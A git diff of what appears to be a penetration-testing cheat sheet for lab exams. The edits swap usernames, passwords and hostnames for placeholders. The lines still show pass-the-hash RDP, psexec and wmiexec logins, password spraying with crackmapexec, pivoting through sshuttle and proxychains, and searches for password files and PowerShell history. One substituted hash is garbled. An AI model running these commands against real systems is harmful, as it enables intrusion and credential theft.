@@ -1052,9 +1052,9 @@ help #always run this after your nc -nv command
 #### Passwords Guessed
 ````
 root:root
-admin@xor.com:admin
+admin@example.com:admin
 admin:admin
-kiero:kiero #name of the box
+USERK:USERK #name of the box
 cassie:cassie #Found users with exiftool
 ````
 ## Web Pentest <img src="https://cdn-icons-png.flaticon.com/512/1304/1304061.png" width="40" height="40" />
@@ -1834,8 +1834,8 @@ Compressed: 25312
 ### Logging in/Changing users
 #### rdp
 ````
-rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d example
-xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
+rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
+xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
 ````
 ## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
 
@@ -1903,7 +1903,7 @@ Access is denied. In this case try Invoke-WebRequest for powershell
 ### SMB Shares Windows to Windows
 ````
 In this situation we have logged onto computer A
-sudo impacket-psexec Admin:'December31'@192.168.203.141 cmd.exe
+sudo impacket-psexec Admin:'password123'@192.168.203.141 cmd.exe
 C:\Windows\system32> ipconfig
  
 Windows IP Configuration
@@ -1928,7 +1928,7 @@ Ethernet adapter Ethernet1:
 ````
 #### Accessing $C Drive of Computer A
 ````
-*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin December31
+*Evil-WinRM* PS C:\windows.old\Windows\system32> net use * \\10.10.93.141\C$ /user:Admin password123
 ````
 #### Copying over files
 ````
@@ -2093,30 +2093,30 @@ dir /s /p local.txt
 ````
 C:\Users\damon> type .gitconfig
 [safe]
-        directory = C:/staging
+        directory = C:/prod
 [user]
         email = damian
         name = damian
 ````
 ````
-C:\Users\damon> cd C:/staging
+C:\Users\damon> cd C:/prod
 ````
 ````
-C:\staging> git log
-fatal: detected dubious ownership in repository at 'C:/staging'
-'C:/staging/.git' is owned by:
+C:\prod> git log
+fatal: detected dubious ownership in repository at 'C:/prod'
+'C:/prod/.git' is owned by:
         'S-1-5-21-464543310-226837244-3834982083-1003'
 but the current user is:
         'S-1-5-18'
 To add an exception for this directory, call:
 
-        git config --global --add safe.directory C:/staging
+        git config --global --add safe.directory C:/prod
 ````
 ````
-C:\staging> git config --global --add safe.directory C:/staging
+C:\prod> git config --global --add safe.directory C:/prod
 ````
 ````
-C:\staging> git log
+C:\prod> git log
 commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
 Author: damian <damian>
 Date:   Thu Oct 20 02:07:42 2022 -0700
@@ -2130,7 +2130,7 @@ Date:   Thu Oct 20 02:06:37 2022 -0700
     V1
 ````
 ````
-C:\staging> git show
+C:\prod> git show
 commit 8b430c17c16e6c0515e49c4eafdd129f719fde74
 Author: damian <damian>
 Date:   Thu Oct 20 02:07:42 2022 -0700
@@ -2154,9 +2154,9 @@ index 77e370c..0000000
 #### Viewing Powershell History
 ````
 PS C:\> (Get-PSReadlineOption).HistorySavePath
-C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
-type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 echo "Let's check if this script works running as damon and password i6yuT6tym@"
 echo "Don't forget to clear history once done to remove the password!"
 Enter-PSSession -ComputerName LEGACY -Credential $credshutdown /s
@@ -2168,7 +2168,7 @@ Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyCont
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
 type C:\xampp\passwords.txt
 
-Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 cat Desktop\asdf.txt
 ````
 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
@@ -2234,14 +2234,14 @@ kill (enter pid #)
 #### sshuttle
 ##### Linux Enviorment
 ````
-sshuttle -r sean@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
+sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #run on your kali machine to proxy traffic into the IT Network
 #In this situation we have rooted a linux machine got user creds and can establish an sshuttle
 #You can visit the next network as normal and enumerate it as normal.
 #best used for everything else but nmap
 ````
 ###### Transfering files via sshuttle
 ````
-sshuttle -r sean@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
+sshuttle -r USERS@10.11.1.251 10.1.1.0/24 #1 Port Foward to our machine
 python3 -m http.server 800 # on our kali machine
 ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.sh #2 on our kali machine to dowload files
 ````
@@ -2250,7 +2250,7 @@ ssh userc@10.1.1.27 curl http://192.168.119.140:800/linpeas.sh -o /tmp/linpeas.s
 ````
 sudo echo "socks4 127.0.0.1 80" >> /etc/proxychains.conf 
 [7:06 PM]
-ssh -NfD 80 sean@10.11.1.251 10.1.1.0/24
+ssh -NfD 80 USERS@10.11.1.251 10.1.1.0/24
 [7:07 PM]
 proxychains nmap -p- --min-rate=1000 10.1.1.27 -Pn #best used for nmap only
 proxychains nmap -sT --top-ports 1000 --min-rate=1000 -Pn  10.1.1.68 -v # better scan
@@ -2286,7 +2286,7 @@ In this example we are 192.168.45.191 attacking an AD exploit chain with interna
 ````
 ##### arp -a
 ````
- sudo impacket-psexec Admin:December31@192.168.236.147 cmd.exe
+ sudo impacket-psexec Admin:password123@192.168.236.147 cmd.exe
 ````
 ````
 We are using the arp -a on MS01 to show where we got some of the IPs, internal and external facing when going through this exploit chain.
@@ -3927,7 +3927,7 @@ net group "Music Department" / domain #Enumerating specific domain group for mem
 ````
 Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
+Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
 ````
 ````
 tree /f C:\Users\ #look for interesting files, backups etc.
@@ -4013,10 +4013,10 @@ This hash does not allow pass-the-hash style attacks, and instead requires Passw
 ##### Powershell
 ````
 PS C:\> (Get-PSReadlineOption).HistorySavePath
-C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 
-type C:\Users\adrian\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
-echo "Let's check if this script works running as damon and password i6yuT6tym@"
+type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+echo "Let's check if this script works running as damon and password password123"
 ````
 ##### PowerView
 ````
@@ -4072,7 +4072,7 @@ sekurlsa::tickets
 ##### Network
 ````
 nslookup #use this tool to internally find the next computer to pivot to.
-xor-app23.xor.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
+example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
 Address: 10.11.1.121
 ````
 ###### SMB
@@ -4093,8 +4093,8 @@ impacket-wmiexec medtech/leon:'rabbit:)'@172.16.138.10
 ````
 ###### RDP
 ````
-rdesktop -u 'Nathan' -p 'abc123//' 192.168.129.59 -g 94% -d example
-xfreerdp /v:10.1.1.89 /u:xavier /pth:5e22b03be22022754bf0975251e1e7ac
+rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
+xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
 xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
 xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
 ````
@@ -4110,12 +4110,12 @@ Enter Password
 ##### Spray and Pray
 ````
 sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
-sudo crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d example.com
+sudo crackmapexec smb 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
 sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
 sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
 sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
 sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
-sudo crackmapexec winrm 192.168.50.75 -u dave -p 'Flowers1' -d example.com
+sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
 sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
 proxychains crackmapexec mssql -d example.com -u sql_svc -p password123  -x "whoami" 10.10.126.148
 ````
